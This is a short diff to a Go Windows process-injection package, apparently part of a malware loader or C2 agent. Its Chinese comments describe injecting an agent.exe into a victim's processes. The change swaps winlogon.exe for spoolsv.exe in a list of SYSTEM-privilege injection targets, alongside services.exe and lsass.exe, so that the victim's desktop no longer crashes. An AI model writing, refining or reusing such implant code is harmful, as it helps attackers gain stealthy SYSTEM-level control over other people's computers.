@@ -1,6 +1,8 @@
 //go:build windows
 // +build windows
 //进程注入存在问题，执行命令会导致受害者桌面崩溃，貌似是因为agent.exe太大
+//注释掉了winlogon.exe，添加了spoolsv.exe，目前测试不再崩溃
+
 
 package inject
 
@@ -116,7 +118,8 @@ func findTargetProcess() (uint32, string) {
 	// 优先级列表：优先选择高权限进程
 	targets := []string{
 		// SYSTEM 权限进程（如果 Loader 有足够权限）
-		"winlogon.exe", // 登录进程，SYSTEM 权限
+		//"winlogon.exe", // 登录进程，SYSTEM 权限
+		"spoolsv.exe",   //后台打印服务，SYSTEM 权限
 		"services.exe", // 服务控制管理器，SYSTEM 权限
 		"lsass.exe",    // 本地安全权限服务，SYSTEM 权限
 
